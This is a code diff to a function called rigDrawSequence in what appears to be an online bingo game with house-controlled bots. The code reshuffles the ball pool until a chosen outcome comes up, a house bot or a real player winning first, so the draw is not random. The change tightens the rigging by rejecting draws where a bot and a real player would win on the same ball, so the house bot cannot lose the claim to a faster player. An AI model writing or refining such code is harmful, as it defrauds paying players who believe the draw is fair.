@@ -233,7 +233,7 @@ export function botsAlreadyInjected(gameId: string): boolean {
 export function rigDrawSequence(
   tickets: { userId: string; card: any; isBot?: boolean }[],
   houseShouldWin: boolean,
-  maxAttempts = 500,
+  maxAttempts = 2000,
   minDrawn = 20  // minimum balls drawn before any win is valid
 ): number[] {
   const botUserIds = tickets
@@ -249,26 +249,40 @@ export function rigDrawSequence(
       [pool[i], pool[j]] = [pool[j], pool[i]];
     }
 
-    // Simulate drawing numbers one by one
     let firstWinnerIsBot: boolean | null = null;
     let winAtBall = 0;
 
     for (let drawn = 1; drawn <= pool.length; drawn++) {
       const drawnSoFar = pool.slice(0, drawn);
 
+      const winnersAtThisBall = [];
       for (const ticket of tickets) {
         const rows = parseCardRows(ticket.card);
         if (!rows) continue;
 
         const result = checkWin(rows, drawnSoFar);
         if (result.won) {
-          firstWinnerIsBot = botUserSet.has(ticket.userId);
-          winAtBall = drawn;
-          break;
+          winnersAtThisBall.push(ticket);
         }
       }
 
-      if (firstWinnerIsBot !== null) break;
+      if (winnersAtThisBall.length > 0) {
+        winAtBall = drawn;
+        const botWon = winnersAtThisBall.some(t => botUserSet.has(t.userId));
+        const playerWon = winnersAtThisBall.some(t => !botUserSet.has(t.userId));
+
+        if (botWon && !playerWon) {
+          firstWinnerIsBot = true;
+        } else if (playerWon && !botWon) {
+          firstWinnerIsBot = false;
+        } else {
+          // TIE! Both a bot and a real player won on the exact same ball.
+          // Since bots have a 2-3 second claim delay, a real player could steal it.
+          // We must reject this sequence to be safe.
+          firstWinnerIsBot = houseShouldWin ? false : true; 
+        }
+        break;
+      }
     }
 
     // Reject any sequence where a win occurs before minDrawn balls
@@ -276,17 +290,14 @@ export function rigDrawSequence(
 
     // Check if this sequence matches what we want
     if (houseShouldWin && firstWinnerIsBot === true) {
-      // Perfect: house bot wins first in this sequence
-      // Return as a reversed pool (draw with .pop() from end)
-      logger.info(`[RiggedDraw] House win sequence found in ${attempt + 1} attempt(s) at ball #${winAtBall}`);
+      logger.info(`[RiggedDraw] Flawless House win sequence found in ${attempt + 1} attempt(s) at ball #${winAtBall} (No player ties)`);
       return pool.reverse();
     }
     if (!houseShouldWin && firstWinnerIsBot === false) {
-      // Perfect: real player wins first
       logger.info(`[RiggedDraw] Player win sequence found in ${attempt + 1} attempt(s) at ball #${winAtBall}`);
       return pool.reverse();
     }
-    // Wrong outcome — try another shuffle
+    // Wrong outcome or a tie — try another shuffle
   }
 
   // Fallback: return a random sequence (exhausted attempts)
